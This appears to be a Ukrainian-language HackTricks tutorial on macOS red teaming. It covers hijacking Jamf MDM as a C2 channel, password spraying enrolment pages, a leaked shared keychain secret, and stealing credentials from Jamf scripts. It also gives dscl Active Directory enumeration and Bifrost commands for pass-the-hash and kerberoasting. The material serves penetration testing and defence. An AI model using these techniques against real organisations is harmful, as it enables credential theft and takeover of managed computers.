# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Зловживання MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Якщо вам вдасться **скомпрометувати облікові дані адміністратора** для доступу до management platform, ви **потенційно зможете скомпрометувати всі комп'ютери**, поширивши malware на ці машини.

Для red teaming у середовищах MacOS наполегливо рекомендується мати певне розуміння принципів роботи MDM:


{{#ref}}
macos-mdm/
{{#endref}}

### Використання MDM як C2

MDM матиме дозвіл на встановлення, запит або видалення профілів, встановлення applications, створення локальних admin accounts, встановлення firmware password, зміну ключа FileVault...

Щоб запустити власний MDM, вам потрібно, щоб ваш CSR був **підписаний vendor**, що можна спробувати отримати через [**https://mdmcert.download/**](https://mdmcert.download/). А для запуску власного MDM для Apple devices можна використати [**MicroMDM**](https://github.com/micromdm/micromdm).

Однак для встановлення application на enrolled device вона все одно має бути підписана developer account... проте під час MDM enrolment **device додає SSL cert MDM як trusted CA**, тож тепер ви можете підписати будь-що.<sup>[[4]](#references)</sup>

Щоб enrol device у MDM, потрібно встановити файл **`mobileconfig`** від імені root; його можна доставити через файл **pkg** (його можна стиснути у zip, і після завантаження з Safari він буде розпакований).

**Mythic agent Orthrus** використовує цю техніку.

### Зловживання JAMF PRO

JAMF може запускати **custom scripts** (scripts, розроблені sysadmin), **native payloads** (створення локального account, встановлення EFI password, file/process monitoring...) і **MDM** (device configurations, device certificates...).<sup>[[5]](#references)</sup>

#### JAMF self-enrolment

Перейдіть на сторінку на кшталт `https://<company-name>.jamfcloud.com/enroll/`, щоб перевірити, чи ввімкнено **self-enrolment**. Якщо так, сторінка може **запитати credentials для доступу**.

Для виконання password spraying attack можна використати script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py).

Крім того, після знаходження відповідних credentials ви зможете brute-force інші usernames за допомогою такої форми:

![Зловживання JAMF PRO - JAMF self-enrolment: Крім того, після знаходження відповідних credentials ви зможете brute-force інші usernames за допомогою такої форми](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Бінарний файл **`jamf`** містив secret для відкриття keychain, який на момент виявлення був **спільним** для всіх і мав значення: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Крім того, jamf **persist** як **LaunchDaemon** у **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### JAMF Device Takeover

**URL** **JSS** (Jamf Software Server), який використовуватиме **`jamf`**, розташований у **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Цей файл фактично містить URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Отже, зловмисник може розмістити шкідливий пакет (`pkg`), який під час встановлення **перезапише цей файл**, встановивши **URL до Mythic C2 listener від Typhon agent**, щоб отримати можливість використовувати JAMF як C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### Імітація JAMF

Щоб **імітувати комунікацію** між пристроєм і JMF, вам потрібно:

- **UUID** пристрою: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **JAMF keychain** із: `/Library/Application\ Support/Jamf/JAMF.keychain`, який містить сертифікат пристрою

Маючи цю інформацію, **створіть VM** зі **викраденим** Hardware **UUID** і з **вимкненим SIP**, скопіюйте **JAMF keychain**, встановіть **hook** на Jamf **agent** і викрадіть його інформацію.

#### Викрадення secrets

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Ви також можете моніторити розташування `/Library/Application Support/Jamf/tmp/` на наявність **custom scripts**, які адміністратори можуть захотіти виконати через Jamf, оскільки вони **поміщаються сюди, виконуються та видаляються**. Ці scripts **можуть містити credentials**.

Однак **credentials** можуть передаватися цим scripts як **parameters**, тому вам потрібно буде моніторити `ps aux | grep -i jamf` (навіть без root).

Script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) може відстежувати додавання нових файлів і нові аргументи процесів.

### Віддалений доступ до macOS

А також щодо "спеціальних" **мережевих** **protocols** MacOS:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

У деяких випадках ви виявите, що **комп'ютер MacOS підключений до AD**. У цьому сценарії вам слід спробувати **enumerate** active directory так, як ви це зазвичай робите. Знайдіть **допомогу** на таких сторінках:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Деякі **локальні інструменти MacOS**, які також можуть вам допомогти, використовують `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Також існують деякі інструменти, підготовлені для MacOS, щоб автоматично виконувати enumeration AD і працювати з Kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound — це розширення інструмента аудиту BloodHound, що дає змогу збирати та імпортувати зв’язки Active Directory на хостах MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost — це проєкт Objective-C, призначений для взаємодії з API Heimdal krb5 у macOS. Мета проєкту — забезпечити краще тестування безпеки Kerberos на пристроях macOS за допомогою native API, без потреби в будь-яких інших framework або packages на цільовій системі.
- [**Orchard**](https://github.com/its-a-feature/Orchard): інструмент JavaScript for Automation (JXA) для виконання enumeration Active Directory.

### Інформація про домен
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Користувачі

Існує три типи користувачів MacOS:

- **Локальні користувачі** — керуються локальною службою OpenDirectory і жодним чином не підключені до Active Directory.
- **Мережеві користувачі** — тимчасові користувачі Active Directory, яким для автентифікації потрібне підключення до сервера DC.
- **Мобільні користувачі** — користувачі Active Directory з локальною резервною копією облікових даних і файлів.

Локальна інформація про користувачів і групи зберігається в папці _/var/db/dslocal/nodes/Default._\
Наприклад, інформація про користувача з іменем _mark_ зберігається в _/var/db/dslocal/nodes/Default/users/mark.plist_, а інформація про групу _admin_ — у _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Окрім використання зв’язків HasSession і AdminTo, **MacHound додає до бази даних Bloodhound три нові зв’язки**:<sup>[[2]](#references)</sup>

- **CanSSH** — сутність, якій дозволено виконувати SSH-підключення до хоста
- **CanVNC** — сутність, якій дозволено виконувати VNC-підключення до хоста
- **CanAE** — сутність, якій дозволено виконувати скрипти AppleEvent на хості
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Більше інформації: [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Пароль Computer$

Отримуйте паролі за допомогою:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Можна отримати доступ до пароля **`Computer$`** у System keychain.

### Over-Pass-The-Hash

Отримайте TGT для певного користувача та сервісу:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Після отримання TGT його можна інжектити в поточну сесію за допомогою:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Отримавши service tickets, можна спробувати отримати доступ до спільних ресурсів на інших комп’ютерах:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Отримання доступу до Keychain

Keychain, найімовірніше, містить конфіденційну інформацію, яка в разі отримання доступу без виклику prompt могла б допомогти просунутися далі під час Red Team exercise:


{{#ref}}
macos-keychain.md
{{#endref}}

## Зовнішні сервіси

macOS Red Teaming відрізняється від звичайного Windows Red Teaming, оскільки **macOS зазвичай безпосередньо інтегрована з кількома зовнішніми платформами**. Поширена конфігурація macOS передбачає доступ до комп'ютера за допомогою **синхронізованих через OneLogin облікових даних**, а також доступ до кількох зовнішніх сервісів (наприклад, github, aws...) через OneLogin.

## Різні Red Team техніки

### Safari

Коли файл завантажується в Safari, якщо це «безпечний» файл, його буде **автоматично відкрито**. Наприклад, якщо ви **завантажите zip**, його буде автоматично розпаковано:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Gone Apple Pickin': Red Teaming MacOS Environments in 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Introducing MacHound: A Solution to macOS Active Directory Based Attacks](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: Turning macOS Management Evil](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Active Directory Discovery with a Mac - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)


{{#include ../../banners/hacktricks-training.md}}
